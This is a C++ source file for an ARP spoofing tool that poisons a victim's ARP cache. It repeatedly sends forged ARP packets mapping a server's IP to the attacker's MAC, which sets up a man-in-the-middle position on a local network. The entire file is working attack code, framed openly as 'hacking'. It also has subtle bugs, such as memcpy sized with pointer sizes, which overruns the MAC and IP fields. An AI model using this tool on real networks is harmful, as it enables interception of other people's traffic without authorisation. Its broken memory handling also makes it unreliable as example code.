#include <iostream>
#include <typeinfo>
#include <bitset>
#include <iomanip>
#include <string.h>
#include <unistd.h> // for sleep() function
#include <sys/socket.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <thread>

#include <pcap.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>

using namespace std;

void sendARP(pcap_t* pcd, uint8_t arp_packet);

void atoiIP(char* addr, uint8_t* ip);
void printMAC(uint8_t* add, int length);
int getAttackerMAC(uint8_t* attacker_mac, char* device);
void getMAC(uint8_t* victim_ip, uint8_t* victim_mac);
void makeEther(struct ether_header* ether, uint8_t* attacker_mac, uint8_t* victim_mac);
void makeArp(struct ether_arp* arp, uint8_t* server_ip, uint8_t* victim_ip, uint8_t* attacker_mac, uint8_t* victim_mac);

int main(int argc, char* argv[]) {
  // victim <-> attacker <-> server
  // sudo ./hackARP device_name server_ip victim_ip
  char err_buf[PCAP_ERRBUF_SIZE];
  pcap_t *pcd;

  // cout << device << endl;
  char* device = argv[1];

  // Change the mac address of this ip address(sourceIP) to your mac address.
  uint8_t server_ip[4];
  atoiIP(argv[2], server_ip);

  // victim IP Address
  uint8_t victim_ip[4];
  atoiIP(argv[3], victim_ip);

  // get the attacker mac
  uint8_t attacker_mac[6];
  getAttackerMAC(attacker_mac, device);

  // get the victim mac
  uint8_t victim_mac[6];
  getMAC(victim_ip, victim_mac);

  // get the server mac
  uint8_t server_mac[6];
  getMAC(server_ip, server_mac);

  // allocate as much as the header size
  struct ether_header ether;
  struct ether_arp arp;
  memset(&ether, 0, sizeof(struct ether_header));
  memset(&arp, 0, sizeof(struct ether_arp));

  // open the pcap
  if((pcd = pcap_open_live(device, BUFSIZ, 1, 1, err_buf)) == NULL){
    perror(err_buf);
    exit(1);
  }

  // make Ethernet header
  makeEther(&ether, attacker_mac, victim_mac);

  // make ARP header
  makeArp(&arp, server_ip, victim_ip, attacker_mac, victim_mac);

  // allocate as much as the packet size
  uint8_t arp_packet[42];
  memset(arp_packet, 0, sizeof(arp_packet));

  // copy the ethernet and arp header
  memcpy(&arp_packet, &ether, sizeof(ether));
  memcpy(arp_packet+sizeof(ether), &arp, sizeof(arp));

  // send the packet
  while(1) {
    cout << "hacking the arp table..." << endl;
    pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));
    usleep(100000);
  }
}

void atoiIP(char* ch_ip, uint8_t* num_ip) {
  int i = 0;

  char* temp = strtok(ch_ip, ".");
  while (temp != NULL){
    num_ip[i] = atoi(temp);
    temp = strtok(NULL,".");
    // printf("%d\n", num_ip[i]);
    i++;
  }
}

void printMAC(uint8_t* add, int length){
  for(int i=0;i<length;i++){
    printf("%02x ", add[i]);
  }
  cout << endl;
}

int getAttackerMAC(uint8_t* attacker_mac, char* device) {
    struct ifreq ifr;
    int s;
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
      perror("socket");
      return -1;
    }

    strcpy(ifr.ifr_name, device);
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
      perror("ioctl");
      return -1;
    }

    memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);

    close(s);
}

void getMAC(uint8_t* ip, uint8_t* mac) {
    char fbuffer[18], ch_ip[20];
    int i = 0;

    sprintf(ch_ip, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);

    char system_call[50];
    sprintf(system_call, "arp -a %s | cut -f 4 -d \" \" > mac.txt", ch_ip);
    system(system_call);

    FILE *fp = fopen("mac.txt", "r");
    fgets(fbuffer, sizeof(fbuffer), fp);

    char* temp = strtok(fbuffer, ":");
    while (temp != NULL) {
      mac[i] = strtol(temp, NULL, 16);
      temp = strtok(NULL, ":");
      // printf("%02x\n", victim_mac[i]);
      i++;
    }
}

void makeEther(struct ether_header* ether, uint8_t* attacker_mac, uint8_t* victim_mac) {
  // set
  // uint8_t dhost[6];
  // uint8_t shost[6];
  uint16_t type = 0x0806;

  // copy
  memcpy(ether->ether_dhost, victim_mac, sizeof(victim_mac));
  memcpy(ether->ether_shost, attacker_mac, sizeof(attacker_mac));
  ether->ether_type = htons(type);

  // Print
  // cout << "ether->ehter_dhost: ";
  // printMAC(ether->ether_dhost, 6);
  // cout << "ether->ehter_shost: ";
  // printMAC(ether->ether_shost, 6);
  // printf("ether->ether_type: %04x\n", ether->ether_type);
}

void makeArp(struct ether_arp* arp, uint8_t* server_ip, uint8_t* victim_ip, uint8_t* attacker_mac, uint8_t* victim_mac) {
  // set
  unsigned short int ar_hrd = 0x0001;
  unsigned short int ar_pro = 0x0800;
  unsigned char ar_hln = 0x06;
  unsigned char ar_pln = 0x04;
  unsigned short int ar_op = 0x0001;
  // uint8_t arp_sha[6] = {0x00, 0x0c, 0x29, 0xd6, 0x99, 0x0d};
  // u_int8_t sender_ip[4] = ip;
  uint8_t arp_tha[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  // u_int8_t target_ip[4] = {0xc0, 0xa8, 0x50, 0x81};

  // copy
  arp->ea_hdr.ar_hrd = htons(ar_hrd);
  arp->ea_hdr.ar_pro = htons(ar_pro);
  arp->ea_hdr.ar_hln = ar_hln;
  arp->ea_hdr.ar_pln = ar_pln;
  arp->ea_hdr.ar_op = htons(ar_op);
  memcpy(arp->arp_sha, attacker_mac, sizeof(attacker_mac));
  memcpy(arp->arp_spa, server_ip, sizeof(server_ip));
  // memcpy(arp->sender_ip, sender_ip, sizeof(sender_ip));
  memcpy(arp->arp_tha, victim_mac, sizeof(victim_mac));
  // memcpy(arp->arp_tha, target_mac, sizeof(target_mac));
  memcpy(arp->arp_tpa, victim_ip, sizeof(victim_ip));
  // memcpy(arp->target_ip, target_ip, sizeof(target_ip));

  // Print
  // printf("arp->ea_hdr.ar_hrd: %04x\n", arp->ea_hdr.ar_hrd);
  // printf("arp->ea_hdr.ar_pro: %04x\n", arp->ea_hdr.ar_pro);
  // printf("arp->ea_hdr.ar_hln: %02x\n", arp->ea_hdr.ar_hln);
  // printf("arp->ea_hdr.ar_pln: %02x\n", arp->ea_hdr.ar_pln);
  // printf("arp->ea_hdr.ar_op: %04x\n", arp->ea_hdr.ar_op);
  // cout << "arp->arp_sha: ";
  // printMAC(arp->arp_sha, 6);
  // cout << "arp->arp_spa: ";
  // printMAC(arp->arp_spa, 4);
  // cout << "arp->arp_tha: ";
  // printMAC(arp->arp_tha, 6);
  // cout << "arp->arp_tpa: ";
  // printMAC(arp->arp_tpa, 4);
}
